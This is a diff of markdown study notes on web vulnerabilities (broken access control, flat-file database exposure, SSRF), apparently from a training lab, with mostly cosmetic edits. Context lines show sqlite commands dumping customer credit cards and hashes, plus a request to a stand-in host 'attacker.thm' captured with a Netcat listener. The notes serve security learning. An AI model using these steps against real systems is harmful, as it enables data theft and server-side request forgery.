@@ -1,4 +1,4 @@
-# BROKEN ACCESS CONTROL — SIMPLE NOTES  
+# BROKEN ACCESS CONTROL   
 
 ## 🔹 What is it?  
 - Websites have some pages or actions that are **restricted** (e.g., only Admin should manage users).  
@@ -171,7 +171,7 @@
 - Protect **data in transit (moving)** and **data at rest (stored)**.  
 - If not → attackers can steal, read, or modify sensitive information.
 ---
-# SENSITIVE DATA EXPOSURE (via Flat-File Databases) — SIMPLE NOTES  
+# SENSITIVE DATA EXPOSURE (via Flat-File Databases)   
 
 ## 🔹 What is the issue?  
 - Websites often store data in a **database** (like MySQL, MariaDB, or SQLite).  
@@ -221,6 +221,7 @@ sqlite> PRAGMA table_info(customers);
 3|password|TEXT|1||0
 ```
 👉 Columns: custID, custName, creditCard, password
+
 6. Dump all data
 ``` bash
 sqlite> SELECT * FROM customers;
@@ -236,7 +237,9 @@ sqlite> SELECT * FROM customers;
 - custName → User’s real name
 - creditCard → FULL credit card numbers 🤯
 - password → Stored as a hash (e.g., 5f4dcc3b5aa765d61d8327deb882cf99)
+  
 👉 Even though passwords are hashed, attackers can crack the hashes.
+
 👉 Credit card data here is already in plain text (very dangerous).
 ## 🔹 Why is this a big problem?
 - Attackers get:
@@ -1119,7 +1122,7 @@ Web app sends request to attacker-controlled server:
 https://attacker.thm/api/send?msg=ABC
 
 Capture request with Netcat:  
-
+```
 nc -lvp 80
 Listening on 0.0.0.0 80
 Connection received on 10.10.1.236 43830
@@ -1127,7 +1130,7 @@ GET /:8087/public-docs/123.pdf HTTP/1.1
 Host: 10.10.10.11
 User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
 Accept: /
-
+```
 ---
 
 ## Potential Impact  
